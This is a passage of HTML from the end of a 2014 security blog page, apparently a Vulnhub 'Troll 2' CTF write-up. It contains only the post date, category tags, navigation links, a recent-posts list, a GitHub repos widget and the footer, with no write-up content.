<time datetime="2014-10-10T17:32:35+02:00" pubdate data-updated="true">Oct 10<sup>th</sup>, 2014</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/challenge/'>challenge</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/solution/'>solution</a>, <a class='category' href='/blog/categories/vulnerable-vm/'>vulnerable vm</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/" data-via="leonjza" data-counturl="http://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2014/09/18/from-persistence/" title="Previous Post: From Persistence, to pain, to PWN">&laquo; From Persistence, to pain, to PWN</a>
      
      
        <a class="basic-alignment right" href="/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/" title="Next Post: knock-knock who’s there?">knock-knock who’s there? &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">knock-knock who’s there?</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/10/another-troll-tamed-solving-troll-2/">another troll tamed - solving troll 2</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/09/18/from-persistence/">From Persistence, to pain, to PWN</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/17/kali-linux-oracle-support/">Kali Linux Oracle Support</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/15/taming-the-troll/">taming (actually just solving) the troll</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/09/beating-xerxes2/">Beating Xerxes 2 (no, not the Persian King)</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/07/flick-can-you-find-the-flag/">flick - can you find the flag?</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/07/20/hell-would-just-not-freeze-over/">Hell would just not freeze over!</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/07/17/climbing-the-skytower/">Climbing the SkyTower</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/">dnsfilexfer - yet another take on file transfer via DNS</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/leonjza">@leonjza</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'leonjza',
            count: 8,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2014 - Leon Jacobs -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
